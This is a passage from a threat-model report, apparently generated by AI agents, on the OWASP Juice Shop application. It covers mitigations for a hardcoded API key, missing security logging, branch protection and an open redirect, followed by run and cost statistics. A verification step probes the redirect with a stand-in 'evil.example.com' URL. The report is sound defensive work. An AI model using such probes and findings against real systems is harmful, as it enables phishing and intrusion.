1. Immediately rotate the Alchemy API key via the Alchemy dashboard (treat current key as compromised)
2. Replace hardcoded value with `process.env.ALCHEMY_API_KEY`
3. Add `ALCHEMY_API_KEY` to the required environment variables list in documentation and Docker Compose

**Verification:** `grep -r "alchemy.com/v2/" .` returns no hardcoded API keys. Application requires `ALCHEMY_API_KEY` env var at startup.

**Reference:** CWE-798

---

<a id="m-026"></a>**M-026 — Implement structured security event logging**
**Addresses:** [T-015](#t-015)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟡 Medium
**Effort:** Medium

**Why:** There is no dedicated security event log. Failed logins, privilege changes, and file access events are not captured in a way that supports incident response.

**How:**
1. Add a security logger using `winston` with structured JSON output: `{ timestamp, userId, ip, event, outcome }`
2. Log events: login success/failure, password change, role change, admin action, file upload, API key usage
3. Write to a separate file (`security-events.log`) distinct from Morgan's HTTP log
4. Remove `/support/logs` public directory access (M-006) — logs should only be accessible by authenticated admins via a secure endpoint
5. Consider forwarding to an external SIEM

**Verification:** Failed login attempt produces a structured JSON log entry with userId, IP, and timestamp within 1 second.

**Reference:** [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html), CWE-778

---

<a id="m-027"></a>**M-027 — Add branch protection and required code review to master**
**Addresses:** [T-029](#t-029)
**Priority:** **P3 — Next Quarter**
**Severity:** 🟢 Low
**Effort:** Low

**Why:** GitHub repository lacks branch protection rules requiring at least 1 reviewer approval before merging to master. A compromised maintainer account could push malicious code directly.

**How:**
1. Enable branch protection on `master`: Settings → Branches → Add rule → Require pull request reviews (1 minimum)
2. Enable "Require status checks to pass" (CI, CodeQL)
3. Enable "Dismiss stale reviews when new commits are pushed"
4. Consider enabling "Require signed commits" for the master branch

**Verification:** Direct push to master branch is rejected. PR without approval cannot be merged.

**Reference:** CWE-284

---

### P4 — Backlog

<a id="m-028"></a>**M-028 — Add allowlist enforcement to open redirect endpoint**
**Addresses:** [T-030](#t-030)
**Priority:** **P4 — Backlog**
**Severity:** 🟠 High
**Effort:** Low

**Why:** `/redirect?to=<url>` performs redirect without validating the target against an allowlist. This enables phishing using the application's trusted domain as a launchpad.

**How:**
1. Define an allowlist of permitted redirect targets (e.g., GitHub, OWASP project pages used as challenge references)
2. In the redirect handler, check `url` against the allowlist before redirecting
3. If the URL is not in the allowlist, return 400 with an error page rather than silently redirecting

```typescript
const REDIRECT_ALLOWLIST = ['https://github.com/juice-shop/', 'https://owasp.org/']
if (\!REDIRECT_ALLOWLIST.some(allowed => url.startsWith(allowed))) {
  return res.status(400).json({ error: 'Redirect target not permitted' })
}
```

**Verification:** `/redirect?to=https://evil.example.com` returns 400. `/redirect?to=https://github.com/juice-shop/juice-shop` redirects successfully.

**Reference:** [OWASP Unvalidated Redirects Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html), CWE-601

---

## 11. Out of Scope

The following areas were not analyzed in this assessment:

1. **Web3/NFT module full analysis** — The `routes/nftMint.ts` and `frontend/wallet-web3/` Ethereum integration was noted for the hardcoded API key (T-028) but smart contract security analysis and Ethereum-specific attack vectors were not assessed.
2. **Chatbot training data and model** — The `juicy-chat-bot` dependency's internal logic and training data pipeline beyond the SSRF vector were not analyzed.
3. **Performance and availability under load** — No load testing or DoS simulation was performed beyond code-level analysis of vulnerable sinks.
4. **Physical security and infrastructure** — Deployment infrastructure, network topology, and cloud provider configuration were not reviewed.
5. **Third-party OWASP challenge integrations** — Some challenge routes pull in OWASP-specific content or external APIs; their security was not assessed beyond what is visible in the source.
6. **Internationalization and translation files** — The `i18n/` directory was not reviewed for injection or encoding issues in translated strings.
7. **Automated challenge solve detection** — The `lib/challengeUtils.ts` challenge verification logic was not assessed for bypass conditions beyond what was observed in the STRIDE analysis.

---

## Appendix: Run Statistics

### Invocation

```
create-threat-model --assessment-depth thorough --with-sca --full --verbose
```

### Configuration

| Parameter | Value |
|-----------|-------|
| Mode | full |
| Depth | thorough |
| Plugin Version | 0.9.0-beta |
| Analysis Version | 1 |
| SCA | enabled |
| Verbose | enabled |

### Agents

| Agent | Model | Role |
|-------|-------|------|
| threat-analyst | claude-sonnet-4-6 | Orchestrator (Phases 1, 3-11) |
| context-resolver | claude-sonnet-4-6 | Context resolution (Phase 1) |
| recon-scanner | claude-sonnet-4-6 | Reconnaissance scan (Phase 2) |
| dep-scanner | claude-sonnet-4-6 | SCA dependency scan (Phase 2, background) |
| qa-reviewer | claude-sonnet-4-6 | QA review (post-assessment) |

### Phase Durations

| Phase | Description | Duration | Status |
|-------|-------------|----------|--------|
| Phase 1 | Context Resolution | 0s | Completed (cache hit) |
| Phase 2 | Reconnaissance | 1m 38s | Completed |
| Phase 3 | Architecture Modeling | 1m 13s | Completed |
| Phase 4 | Security Use Cases | inline | Completed |
| Phase 5 | Asset Identification | inline | Completed |
| Phase 6 | Attack Surface Mapping | inline | Completed |
| Phase 7 | Trust Boundary Analysis | inline | Completed |
| Phase 8 | Security Controls Catalog | inline | Completed |
| Phase 9 | STRIDE Threat Enumeration | inline | Completed (8 components) |
| Phase 10 | Scan Synthesis | inline | Completed |
| Phase 11 | Finalization | 21m 56s | Completed |
| QA Review | Quality assurance | 7m 58s | Completed |
| **Total** | | **37m 58s** | **(assessment: 30m 00s + QA: 7m 58s)** |

### Token Consumption (delta-verified)

Run window: `2026-04-14T04:22:11Z` → `2026-04-14T05:00:53Z`

| Category | Tokens |
|----------|--------|
| Input | 67 |
| Output | 22,854 |
| Cache Write | 164,923 |
| Cache Read | 2,065,729 |
| **Total** | **2,253,573** |

### Cost Estimate (with Prompt Caching)

Costs based on Claude Sonnet 4.6 API pricing ($3.00/MTok input, $15.00/MTok output, $3.75/MTok cache write, $0.30/MTok cache read). Values are delta-verified: for each session, the cost is computed as (final cumulative snapshot within the run window) minus (last cumulative snapshot before the run started). Cross-checked against the API pricing formula.

| Session | Agent(s) | In | Out | Cache Write | Cache Read | Logged | Computed | Check |
|---------|----------|----|-----|-------------|------------|--------|----------|-------|
| 0d4d416a | Explore (recon) | 30 | 7,904 | 82,167 | 792,930 | ~$0.6647 | $0.6647 | OK |
| 54d3a9bf | threat-analyst, qa-reviewer | 37 | 14,950 | 82,756 | 1,272,799 | ~$0.9165 | $0.9165 | OK |
| **Total** | | **67** | **22,854** | **164,923** | **2,065,729** | **~$1.58** | **$1.58** | **OK** |

### Hypothetical Cost (without Prompt Caching)

If no tokens had been cached (all cache read/write tokens counted as regular input at $3.00/MTok):

| Category | Tokens | Rate | Cost |
|----------|--------|------|------|
| Input (incl. cache write + read) | 2,230,719 | $3.00/MTok | ~$6.69 |
| Output | 22,854 | $15.00/MTok | ~$0.34 |
| **Total without caching** | | | **~$7.03** |
| **Actual cost (with caching)** | | | **~$1.58** |
| **Savings from caching** | | | **~$5.45 (77.5%)** |

### Findings Summary

| Metric | Count |
|--------|-------|
| Components analyzed | 8 |
| Threats identified | 30 |
| Critical threats | 10 |
| High threats | 15 |
| Medium threats | 4 |
| Low threats | 1 |
| Mitigations | 28 |
| P1 mitigations | 11 |
| P2 mitigations | 9 |
| P3 mitigations | 5 |
| P4 mitigations | 1 |
| Assets catalogued | 12 |
| Attack surface entries | 35 |
| Trust boundaries | 6 |
| Security controls rated | 20 |

